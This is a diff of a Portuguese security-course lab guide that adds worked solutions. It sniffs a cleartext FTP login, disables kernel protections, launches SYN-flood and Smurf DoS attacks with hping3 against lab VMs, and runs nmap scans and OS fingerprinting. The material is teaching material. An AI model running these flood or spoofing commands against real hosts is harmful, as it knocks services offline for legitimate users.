@@ -1970,16 +1970,16 @@ vboxvideo              36864  0</pre>
 <p>Em <em>Folder Path</em>, clique na seta e depois em <em>Other&#8230;&#8203;</em> . Em seguida, navegue até a pasta a ser compartilhada entre a máquina física e a VM e clique em <em>Select Folder</em>. Abaixo, marque as caixas <em>Auto-mount</em> e <em>Make Permanent</em>. Sua janela deve ficar assim:</p>
 <div id="img-sharedfolder" class="imageblock" style="text-align: center">
 <div class="content">
-<img src="./img/Vbox_sharedfolder.png" alt="Vbox sharedfolder">
+<img src="./img/virtualbox-1.png" alt="virtualbox 1">
 </div>
 <div class="title">Figure 30. Configuração de pasta compartilhada no Virtualbox</div>
 </div>
 </li>
 <li>
-<p>Agora, reinicie a máquina <em>WinServer-G</em>. Após o <em>reboot</em>, abra o Windows Explorer e verifique que há um novo local de rede montado. No exemplo abaixo, a pasta compartilhada tem o nome <em>SEG12_Semana2_Programas</em>.</p>
+<p>Agora, reinicie a máquina <em>WinServer-G</em>. Após o <em>reboot</em>, abra o Windows Explorer e verifique que há um novo local de rede montado. No exemplo abaixo, a pasta compartilhada tem o nome <em>shared</em>.</p>
 <div id="img-sharedfolder-view" class="imageblock" style="text-align: center">
 <div class="content">
-<img src="./img/Vbox_sharedfolder_view.png" alt="Vbox sharedfolder view">
+<img src="./img/virtualbox-2.png" alt="virtualbox 2">
 </div>
 <div class="title">Figure 31. Visualização de pasta compartilhada no Virtualbox</div>
 </div>
@@ -2006,31 +2006,61 @@ vboxvideo              36864  0</pre>
 </tr>
 </table>
 </div>
-<div class="paragraph">
-<p>Primeiro, baixe e instale o <em>Microsoft Visual C++ Redistributable Packages for Visual Studio 2013</em> (<a href="https://www.microsoft.com/en-US/download/details.aspx?id=40784" class="bare">https://www.microsoft.com/en-US/download/details.aspx?id=40784</a>), como usuário <em>Administrator</em>, na máquina <em>WinServer-G</em>. Se preferir, faça o download na máquina física e copie o arquivo via pasta compartilhada, como explicado na atividade 1.</p>
-</div>
-<div class="paragraph">
-<p>Em seguida, faça o download do Wireshark (versão 32-bit) em <a href="https://www.wireshark.org/download/win32/all-versions/Wireshark-win32-2.2.16.exe" class="bare">https://www.wireshark.org/download/win32/all-versions/Wireshark-win32-2.2.16.exe</a> e, como usuário <em>Administrator</em>, instale-o na máquina <em>WinServer-G</em>. Iremos instalar a versão 2.2 porque é a última compatível com Windows Vista/Windows Server 2008, que é o sistema operacional da máquina <em>WinServer-G</em>.</p>
-</div>
-<div class="paragraph">
-<p>Em seguida:</p>
-</div>
 <div class="olist arabic">
 <ol class="arabic">
 <li>
-<p>Ative a captura de pacotes da placa de rede ethernet&#8201;&#8212;&#8201;o nome da interface deve ser <em>Local Area Connection</em>.</p>
+<p>Como o usuário <em>Administrator</em>, copie o instalador do Wireshark (o arquivo <code>Wireshark-win64-3.0.0.exe</code> disponível na pasta <em>Programas</em> do curso) para a máquina <em>WinServer-G</em>, usando a pasta compartilhada configurada anteriormente. Inicie sua instalação.</p>
+<div id="img-wireshark-1" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/wireshark-1.png" alt="wireshark 1">
+</div>
+<div class="title">Figure 32. Instalação do Wireshark, parte 1</div>
+</div>
+<div class="paragraph">
+<p>Aceite todas as opções padrão do instalador. Confirme também a instalação do Npcap, uma dependência do Wireshark, com suas opções padrão.</p>
+</div>
+<div id="img-wireshark-2" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/wireshark-2.png" alt="wireshark 2">
+</div>
+<div class="title">Figure 33. Instalação do Wireshark, parte 2</div>
+</div>
+<div class="paragraph">
+<p>Ao final do processo, inicie o Wireshark&#8201;&#8212;&#8201;você deverá ver uma janela como a que se segue:</p>
+</div>
+<div id="img-wireshark-3" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/wireshark-3.png" alt="wireshark 3">
+</div>
+<div class="title">Figure 34. Instalação do Wireshark, parte 3</div>
+</div>
+</li>
+<li>
+<p>Ative a captura de pacotes da placa de rede conectada à DMZ (o nome da interface deve ser <em>Ethernet</em>). Clique na barbatana azul no canto superior esquerdo da janela que diz <em>Start capturing packets</em>.</p>
 </li>
 <li>
 <p>No campo <em>Apply a display filter</em>, digite <code>ftp</code> e pressione ENTER. A janela de captura deve ficar vazia, já que não há tráfego FTP acontecendo no momento.</p>
 </li>
 <li>
-<p>Em outra janela, abra o <em>prompt</em> de comando e digite <code>ftp linorg.usp.br</code> .</p>
-</li>
-<li>
-<p>A seguir, informe o usuário como sendo <code>aluno</code>, com senha <code>123456</code> .</p>
+<p>Em outra janela, abra o <em>prompt</em> de comando do Windows (<code>cmd</code>) e digite o comando <code>ftp linorg.usp.br</code> . Em seguida, informe o usuário como sendo <code>aluno</code>, com senha <code>123456</code> .</p>
+<div id="img-wireshark-4" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/wireshark-4.png" alt="wireshark 4">
+</div>
+<div class="title">Figure 35. Envio de usuário/senha por FTP</div>
+</div>
 </li>
 <li>
 <p>De volta ao Wireshark, pare a captura de pacotes e verifique se você consegue visualizar o usuário e a senha informados.</p>
+<div class="paragraph">
+<p>Na imagem abaixo podemos confirmar que, de fato, o usuário e senha são passados em claro pela rede.</p>
+</div>
+<div id="img-wireshark-5" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/wireshark-5.png" alt="wireshark 5">
+</div>
+<div class="title">Figure 36. Captura de sessão FTP no Wireshark</div>
+</div>
 </li>
 </ol>
 </div>
@@ -2052,7 +2082,7 @@ vboxvideo              36864  0</pre>
 </table>
 </div>
 <div class="paragraph">
-<p>Agora, vamos identificar e compreender ataques DoS (<em>Denial of Service</em>) e fazer a análise com um sniffer (Wireshark e/ou <code>tcpdump</code>) para interpretar o modo como os pacotes são elaborados para o respectivo ataque DOS.</p>
+<p>Agora, vamos identificar e compreender ataques DoS (<em>Denial of Service</em>) e fazer a análise com um <em>sniffer</em> (Wireshark e/ou <code>tcpdump</code>) para interpretar o modo como os pacotes são elaborados para o respectivo ataque DoS.</p>
 </div>
 <div class="paragraph">
 <p>Primeiro, vamos investigar o ataque <em>SYN flood</em>. Como tratado na parte teórica do curso, esse ataque consiste em enviar uma grande número de pacotes com a flag SYN ativa. Para realizar o ataque, iremos utilizar a ferramenta <code>hping3</code>.</p>
@@ -2061,18 +2091,177 @@ vboxvideo              36864  0</pre>
 <ol class="arabic">
 <li>
 <p>Será necessário desativar a proteção contra <em>SYN Flooding</em> do kernel da máquina-alvo, que será a VM <em>FWGW1-G</em>. Altere o valor do parâmetro no arquivo <code>/proc/sys/net/ipv4/tcp_syncookies</code>.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># cat /proc/sys/net/ipv4/tcp_syncookies
+1</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># echo 0 &gt; /proc/sys/net/ipv4/tcp_syncookies</pre>
+</div>
+</div>
 </li>
 <li>
-<p>Agora, vamos iniciar uma captura de pacotes, aguardando o ataque. Ainda na máquina <em>FWGW1-G</em>, instale o <code>tcpdump</code> e monitore os pacotes vindos da DMZ, através da interface <code>enp0s8</code>.</p>
+<p>Agora, vamos iniciar uma captura de pacotes, aguardando o ataque. Ainda na máquina <em>FWGW1-G</em>, use o <code>tcpdump</code> para monitorar os pacotes vindos da DMZ&#8201;&#8212;&#8201;através da interface <code>enp0s8</code>.</p>
+<div class="literalblock">
+<div class="content">
+<pre># tcpdump ip -i enp0s8 -n host not 172.16.1.254
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on enp0s8, link-type EN10MB (Ethernet), capture size 262144 bytes</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Note que o filtro acima exclui pacotes IPv6 e pacotes vindos da máquina física (que também encontra-se conectada à rede <em>host-only</em>, com o endereço 172.16.1.254), para não atrapalhar o processo de análise.</p>
+</div>
 </li>
 <li>
 <p>Na máquina <em>KaliLinux-G</em>, como usuário <code>root</code>, use o <code>hping3</code> para iniciar um ataque <em>SYN flood</em> com destino à máquina <em>FWGW1-G</em>, na porta do serviço SSH (com o objetivo, no caso do atacante, de esgotar os recursos de atendimento do serviço a usuários legítimos), com máxima velocidade de output e randomizando os IPs de origem dos pacotes.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+KaliLinux-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># hping3 172.16.1.1 -S -p 22 --flood --rand-source
+HPING 172.16.1.1 (enp0s3 172.16.1.1): S set, 40 headers + 0 data bytes
+hping in flood mode, no replies will be shown</pre>
+</div>
+</div>
+<div class="openblock">
+<div class="content">
+<div class="ulist">
+<ul>
+<li>
+<p><code>-S</code> ativa a <em>flag</em> SYN nos pacotes.</p>
+</li>
+<li>
+<p><code>-p 22</code> determina que a porta de destino será 22/TCP.</p>
+</li>
+<li>
+<p><code>--flood</code> envia pacotes o mais rápido possível, sem mostrar respostas.</p>
+</li>
+<li>
+<p><code>--rand-source</code> habilita o modo de envio com endereços de origem randomizados.</p>
+</li>
+</ul>
+</div>
+</div>
+</div>
 </li>
 <li>
 <p>Ainda com o <code>hping3</code> executando, volte à máquina <em>FWGW1-G</em> e verifique que o ataque está sendo realizado como esperado e interprete a saída do <code>tcpdump</code>. Tente abrir uma nova conexão <code>ssh</code>&#8201;&#8212;&#8201;o que acontece?</p>
+<div class="paragraph">
+<p>Como a saída é muito veloz e ininterrupta, mostramos abaixo um pequeno excerto de 8 pacotes do <em>output</em> do <code>tcpdump</code>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>14:34:46.611124 IP 37.216.172.87.61777 &gt; 172.16.1.1.22: Flags [S], seq 1722418881, win 512, length 0
+14:34:46.612051 IP 196.103.179.0.61789 &gt; 172.16.1.1.22: Flags [S], seq 656608080, win 512, length 0
+14:34:46.612064 IP 237.165.139.119.61790 &gt; 172.16.1.1.22: Flags [S], seq 584215547, win 512, length 0
+14:34:46.612069 IP 41.126.172.32.61791 &gt; 172.16.1.1.22: Flags [S], seq 520478412, win 512, length 0
+14:34:46.612074 IP 164.4.165.114.61792 &gt; 172.16.1.1.22: Flags [S], seq 316807998, win 512, length 0
+14:34:46.612079 IP 239.174.101.252.61793 &gt; 172.16.1.1.22: Flags [S], seq 797534175, win 512, length 0
+14:34:46.612082 IP 80.98.63.179.61794 &gt; 172.16.1.1.22: Flags [S], seq 1624228209, win 512, length 0
+14:34:46.612086 IP 92.168.164.203.61795 &gt; 172.16.1.1.22: Flags [S], seq 1084913676, win 512, length 0</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Note que os IPs de origem são todos distintos, como esperado. Além disso, todos possuem a <em>flag</em> SYN ativada e objetivam a porta 22/TCP do servidor, numa tentativa de exaurir recursos para tratamento de conexão de novos clientes.</p>
+</div>
+<div class="paragraph">
+<p>Assim que o servidor recebe o SYN inicial, ele aloca memória para atender o cliente e responde com um SYN-ACK. No caso de um ataque SYN <em>flood</em>, como o desta atividade, o atacante envia um grande número de pacotes SYN sem qualquer intenção de responder o SYN-ACK recebido com um ACK (e, assim, fechar o <em>three-way handshake</em>). Se o atacante estiver usando endereços IP <em>spoofed</em>, o que estamos fazendo, o SYN-ACK sequer chega a ser recebido.</p>
+</div>
+<div class="paragraph">
+<p>Durante este período o servidor não pode fechar a conexão com um pacote RST, e ela permanece aberta. Antes do <em>timeout</em>, outros pacotes SYN vindos do atacante chegam, e começam a deixar um número crescente de conexões em estado <em>half-open</em>. Eventualmente, as tabelas de <em>overflow</em> de conexão de servidor ficam cheias, e clientes legítimos têm seu acesso negado ao serviço. Para testar esse efeito, tente abrir uma nova conexão <code>ssh</code> com a máquina <em>FWGW1-G</em>&#8201;&#8212;&#8201;após algum tempo, o sistema nos retorna com <em>timeout</em>.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ ssh aluno@172.16.1.1
+ssh: connect to host 172.16.1.1 port 22: Connection timed out</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Para verificar a tabela de conexões corrente, podemos usar o comando <code>ss</code>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># ss -nta | grep '^SYN-RECV' | head -n5
+SYN-RECV   0      0      172.16.1.1:22                 142.97.227.2:36000
+SYN-RECV   0      0      172.16.1.1:22                 15.198.184.201:18948
+SYN-RECV   0      0      172.16.1.1:22                 21.212.184.142:2254
+SYN-RECV   0      0      172.16.1.1:22                 201.62.25.47:18949
+SYN-RECV   0      0      172.16.1.1:22                 14.55.146.26:18953</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Verificando a lista de conexões abertas e em espera pelo <code>ssh</code>, observamos o valor 128 no campo <em>Send-Q</em>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># ss -nta | sed -n '1p;/^LISTEN.*:22/p' | grep -v ':::'
+State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
+LISTEN     0      128          *:22                       *:*</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Esse campo denota o número de bytes não confirmados como recebidos pelo receptor, efetivamente configurando a fila de envio do sistema. Para mais detalhes sobre esse campo em particular, verifique a <em>manpage</em> do comando <code>netstat</code> via <code>man 8 netstat</code>.</p>
+</div>
+<div class="paragraph">
+<p>O número 128 é idêntico aos <em>sysctls</em> <code>net.ipv4.tcp_max_syn_backlog</code> e <code>net.core.somaxconn</code>, como visualizado abaixo:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># sysctl -a | grep max_syn_backlog
+net.ipv4.tcp_max_syn_backlog = 128</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># sysctl -a | grep somaxconn
+net.core.somaxconn = 128</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Esses <em>sysctls</em> são definidos como:</p>
+</div>
+<div class="openblock">
+<div class="content">
+<div class="ulist">
+<ul>
+<li>
+<p><code>net.ipv4.tcp_max_syn_backlog</code>: quantas conexões <em>half-open</em> para as quais um cliente ainda não enviou pacote ACK correspondente podem ser mantidas na fila do kernel. O valor padrão, como visto, é de 128. Se essa fila estiver cheia, clientes legítimos não poderão conectar-se, como observamos anteriormente.</p>
+</li>
+<li>
+<p><code>net.core.somaxconn</code>: número máximo que o <em>sysctl</em> <code>net.ipv4.tcp_max_syn_backlog</code> pode assumir. Atua como um limite superior para o <em>sysctl</em> anterior.</p>
+</li>
+</ul>
+</div>
+</div>
+</div>
 </li>
 <li>
 <p>Na máquina <em>KaliLinux-G</em>, pare a execução do <code>hping3</code> com <code>CTRL + C</code>. Em seguida, reative a proteção <em>TCP SYN Cookies</em> do kernel da máquina <em>FWGW1-G</em>.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+FWGW1-A
+
+# echo 1 &gt; /proc/sys/net/ipv4/tcp_syncookies</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Os SYN <em>cookies</em> implementam uma proteção em que o servidor responde cada SYN inicial com um SYN-ACK contendo o hash criptográfico de um número de sequência construído a partir do endereço IP do cliente, número de porta e outras informações de identificação. Quando o cliente responde, esse hash deve ser incluído no pacote ACK. Finalmente, o servidor verifica esse ACK e só então aloca memória para a conexão. Leia mais sobre os SYN <em>cookies</em> em: <a href="https://cr.yp.to/syncookies.html" class="bare">https://cr.yp.to/syncookies.html</a> .</p>
+</div>
 </li>
 </ol>
 </div>
@@ -2100,18 +2289,142 @@ vboxvideo              36864  0</pre>
 <ol class="arabic">
 <li>
 <p>Será necessário desativar a proteção contra ICMP <em>echo-request</em> para endereço de broadcast no kernel da máquina-alvo, que será a VM <em>FWGW1-G</em>, bem como nas máquinas que responderão aos <em>echo-requests</em> (<em>KaliLinux-G</em> e <em>LinServer-G</em>). Altere o valor do parâmetro no arquivo <code>/proc/sys/net/ipv4/icmp_echo_ignore_broadcasts</code> nas três máquinas.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># echo 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+LinServer-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># echo 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+KaliLinux-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># echo 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Inicie a captura de pacotes, aguardando o ataque. Na máquina <em>FWGW1-G</em>, use o <code>tcpdump</code> para monitorar os pacotes vindos da DMZ, através da interface <code>enp0s8</code>.</p>
+<div class="literalblock">
+<div class="content">
+<pre># tcpdump ip -i enp0s8 -n host not 172.16.1.254
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on enp0s8, link-type EN10MB (Ethernet), capture size 262144 bytes</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Na máquina <em>KaliLinux-G</em>, use o <code>hping3</code> para iniciar um ataque <em>Smurf</em> com destino à máquina <em>FWGW1-G</em>. Envie pacotes ICMP com a máxima velocidade possível para o endereço de <em>broadcast</em> da rede, falsificando a origem com o IP da vítima.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+KaliLinux-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># hping3 172.16.1.255 --icmp --flood --spoof 172.16.1.1
+HPING 172.16.1.255 (enp0s3 172.16.1.255): icmp mode set, 28 headers + 0 data bytes
+hping in flood mode, no replies will be shown</pre>
+</div>
+</div>
+<div class="openblock">
+<div class="content">
+<div class="ulist">
+<ul>
+<li>
+<p><code>--icmp</code> ativa o modo ICMP; por padrão, o <code>hping3</code> envia pacotes do tipo <em>echo-request</em>, que é o que objetivamos.</p>
+</li>
+<li>
+<p><code>--flood</code> envia pacotes o mais rápido possível, sem mostrar respostas.</p>
+</li>
+<li>
+<p><code>--spoof 172.16.1.1</code> falsifica o IP de origem dos pacotes enviados para <em>broadcast</em> como sendo o IP da máquina <em>FWGW1-G</em>.</p>
+</li>
+</ul>
+</div>
+</div>
+</div>
 </li>
 <li>
 <p>De volta à máquina <em>FWGW1-G</em>, verifique que o ataque está sendo realizado como esperado e interprete a saída do <code>tcpdump</code>.</p>
+<div class="paragraph">
+<p>Como a saída é muito veloz e ininterrupta, mostramos abaixo um pequeno excerto de 8 pacotes do <em>output</em> do <code>tcpdump</code>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>14:56:31.489287 IP 172.16.1.1 &gt; 172.16.1.255: ICMP echo request, id 1036, seq 56940, length 8
+14:56:31.489291 IP 172.16.1.30 &gt; 172.16.1.1: ICMP echo reply, id 1036, seq 57196, length 8
+14:56:31.489292 IP 172.16.1.1 &gt; 172.16.1.255: ICMP echo request, id 1036, seq 57196, length 8
+14:56:31.489294 IP 172.16.1.30 &gt; 172.16.1.1: ICMP echo reply, id 1036, seq 57452, length 8
+14:56:31.489295 IP 172.16.1.1 &gt; 172.16.1.255: ICMP echo request, id 1036, seq 57452, length 8
+14:56:31.489297 IP 172.16.1.30 &gt; 172.16.1.1: ICMP echo reply, id 1036, seq 57708, length 8
+14:56:31.490336 IP 172.16.1.10 &gt; 172.16.1.1: ICMP echo reply, id 1036, seq 45932, length 8
+14:56:31.490347 IP 172.16.1.10 &gt; 172.16.1.1: ICMP echo reply, id 1036, seq 46188, length 8</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Note que a máquina <em>FWGW1-G</em> identifica o seu próprio IP como sendo o originário dos pacotes <em>echo-request</em> enviados para <em>broadcast</em>. A seguir, as máquinas <em>LinServer-G</em> e <em>KaliLinux-G</em> (esta, a atacante), respondem em massa com ICMP <em>echo-replies</em> para a vítima, sobrecarregando seus recursos.</p>
+</div>
+<div class="paragraph">
+<p>Finalmente, pode-se usar também a opção <code>-d</code> (ou <code>--data</code>, para <em>data size</em>) do <code>hping3</code>, fazendo com que o tamanho dos pacotes <em>echo-request</em>&#8201;&#8212;&#8201;e por conseguinte dos <em>echo-replies</em>&#8201;&#8212;&#8201;seja tão grande quanto o definido na linha de comando. Isso pode ser utilizado para dar mais força ao ataque, e consumir mais rapidamente a banda da vítima.</p>
+</div>
 </li>
 <li>
 <p>Reative a proteção para ignorar ICMP <em>echo-requests</em> direcionados a <em>broadcast</em> do kernel das máquinas <em>FWGW1-G</em>, <em>LinServer-G</em> e <em>KaliLinux-G</em>.</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+LinServer-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+KaliLinux-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts</pre>
+</div>
+</div>
 </li>
 </ol>
 </div>
@@ -2138,7 +2451,79 @@ vboxvideo              36864  0</pre>
 <div class="olist arabic">
 <ol class="arabic">
 <li>
-<p>Na máquina <em>WinServer-G</em>, inicie o Wireshark e faça-o escutar por pacotes vindos para a interface <em>Local Area Connection</em>. Em paralelo, na máquina <em>KaliLinux-G</em>, use o <code>nmap</code> para fazer um <em>scan</em> <em>verbose</em> da máquina <em>WinServer-G</em>. Analise e compare os resultados obtidos pelo <code>nmap</code> com o que foi observado no Wireshark.</p>
+<p>Na máquina <em>WinServer-G</em>, inicie o Wireshark e faça-o escutar por pacotes vindos para a interface <em>Ethernet</em>. Em paralelo, na máquina <em>KaliLinux-G</em>, use o <code>nmap</code> para fazer um <em>scan</em> <em>verbose</em> da máquina <em>WinServer-G</em>. Analise e compare os resultados obtidos pelo <code>nmap</code> com o que foi observado no Wireshark.</p>
+<div class="paragraph">
+<p>Primeiro, vamos ver o que acontece na máquina <em>KaliLinux-G</em>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nmap -v 172.16.1.20
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-08 02:41 -03
+Initiating ARP Ping Scan at 02:41
+Scanning 172.16.1.20 [1 port]
+Completed ARP Ping Scan at 02:41, 0.00s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 02:41
+Completed Parallel DNS resolution of 1 host. at 02:41, 0.02s elapsed
+Initiating SYN Stealth Scan at 02:41
+(...)
+Completed SYN Stealth Scan at 02:41, 3.07s elapsed (1000 total ports)
+Nmap scan report for 172.16.1.20
+Host is up (0.000095s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+5357/tcp open  wsdapi
+MAC Address: 08:00:27:F6:50:68 (Oracle VirtualBox virtual NIC)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 3.18 seconds
+           Raw packets sent: 1189 (52.300KB) | Rcvd: 1001 (40.052KB)</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Solicita-se um <em>scan</em> <em>verbose</em> da máquina <em>WinServer-G</em>. Após resolução ARP/DNS, o <code>nmap</code> escaneia as mil portas mais comuns para cada protocolo. Depois, ele relata quais portas foram detectadas como abertas, juntamente com o nome de serviço que usualmente escuta naquela porta.</p>
+</div>
+<div class="paragraph">
+<p>Mas&#8230;&#8203; que mil portas são essas? Elas são definidas no arquivo <code>/usr/share/nmap/nmap-services</code>, que possui grande similaridade com o arquivo <code>/etc/services</code>&#8201;&#8212;&#8201;mas, além de listar o serviço na primeira coluna e porta/protocolo na segunda coluna, há uma terceira coluna que indica a probabilidade que uma dada porta seja encontrada aberta. Essa probabilidade é obtida pela equipe do <code>nmap</code> a partir de <em>scans</em> de pesquisa na Internet ao largo.</p>
+</div>
+<div class="paragraph">
+<p>Por exemplo, para descobrir quais são as dez portas mais populares, basta executar:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># cat /usr/share/nmap/nmap-services | grep -v '^#' | awk '{print $3,$2,$1}' | sort -n | tac | head -n10</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>0.484143 80/tcp http
+0.450281 631/udp ipp
+0.433467 161/udp snmp
+0.365163 137/udp netbios-ns
+0.330879 123/udp ntp
+0.297830 138/udp netbios-dgm
+0.293184 1434/udp ms-sql-m
+0.253118 445/udp microsoft-ds
+0.244452 135/udp msrpc
+0.228010 67/udp dhcps</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Finalmente, vamos ver o que aparece no Wireshark da máquina <em>WinServer-G</em>:</p>
+</div>
+<div id="img-nmap-1" class="imageblock" style="text-align: center">
+<div class="content">
+<img src="./img/nmap-1.png" alt="nmap 1">
+</div>
+<div class="title">Figure 37. Captura de scan nmap contra a máquina WinServer-G</div>
+</div>
+<div class="paragraph">
+<p>Note que uma série de pacotes SYN são enviados para diferentes portas do servidor Windows. Por sua vez, o Windows responde com um ACK se a porta estiver aberta, mas o <code>nmap</code> não envia um SYN/ACK em resposta a esse pacote&#8201;&#8212;&#8201;esse é o modo padrão de <em>scan</em> do <code>nmap</code>, TCP SYN, também conhecido como <em>half-open scan</em>.</p>
+</div>
 </li>
 <li>
 <p>Vamos agora explorar outros modos de funcionamento do <code>nmap</code>. Teste os modos: (1) <em>TCP connect scan</em>, (2) <em>TCP NULL scan</em>, (3) <em>TCP FIN scan</em> e (4) <em>TCP Xmas scan</em>, e acompanhe o andamento da varredura de portas através do Wireshark. Procure entender o que está acontecendo e a diferença entre comandos executados, para verificar os conceitos do material teórico.</p>
@@ -2150,7 +2535,7 @@ vboxvideo              36864  0</pre>
 </td>
 <td class="content">
 <div class="paragraph">
-<p>Recomenda-se a leitura da página de manual do <code>nmap</code>, via comando <code>$ man 1 nmap</code>, para estudar o que cada um desses tipos de <em>scan</em> objetiva. A página de manual do <code>nmap</code> é extremamente detalhada e bem-escrita, e uma fonte valiosa de conhecimento relativo à enumeração e teste de vulnerabilidades de máquinas-alvo.</p>
+<p>Recomenda-se a leitura da página de manual do <code>nmap</code>, via comando <code>man 1 nmap</code>, para estudar o que cada um desses tipos de <em>scan</em> objetiva. A página de manual do <code>nmap</code> é extremamente detalhada e bem-escrita, e uma fonte valiosa de conhecimento relativo à enumeração e teste de vulnerabilidades de máquinas-alvo.</p>
 </div>
 <div class="paragraph">
 <p>O guia de referência do <code>nmap</code> também possui um capítulo dedicado às diferentes técnicas para <em>port scanning</em>, acessível em <a href="https://nmap.org/book/man-port-scanning-techniques.html" class="bare">https://nmap.org/book/man-port-scanning-techniques.html</a> .</p>
@@ -2159,9 +2544,114 @@ vboxvideo              36864  0</pre>
 </tr>
 </table>
 </div>
+<div class="paragraph">
+<p>Respectivamente, os <em>scans</em> do tipo <em>connect</em>, <em>NULL</em>, <em>FIN</em> e <em>Xmas</em> podem ser realizados com os comandos:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nmap -sT 172.16.1.20</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nmap -sN 172.16.1.20</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nmap -sF 172.16.1.20</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nmap -sX 172.16.1.20</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Outra funcionalidade do <code>nmap</code> é o <em>OS fingerprinting</em>. Utilize a opção que ativa essa verificação nas máquinas virtuais <em>FWGW1-G</em> e <em>WinServer-G</em>. Use o <code>tcpdump</code> e o Wireshark para verificar a troca de pacotes neste processo.</p>
+<div class="paragraph">
+<p>Primeiro, vamos escanear a máquina <em>FWGW1-G</em>, realizando o <em>OS fingerprinting</em> (opção <code>-O</code>):</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nmap -O 172.16.1.1
+
+(...)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.61 seconds</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Detectou-se que o SO da máquina-alvo é um kernel Linux, versões 3.2 a 4.9. Vamos verificar se o <code>nmap</code> está correto, logando na máquina <em>FWGW1-G</em> e imprimindo a versão do kernel:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># uname -r
+4.9.0-8-amd64</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Perfeito! Vamos partir para o <em>scan</em> da máquina <em>WinServer-G</em>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nmap -O 172.16.1.20
+
+(...)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+(...)
+
+Network Distance: 1 hop
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.04 seconds</pre>
+</div>
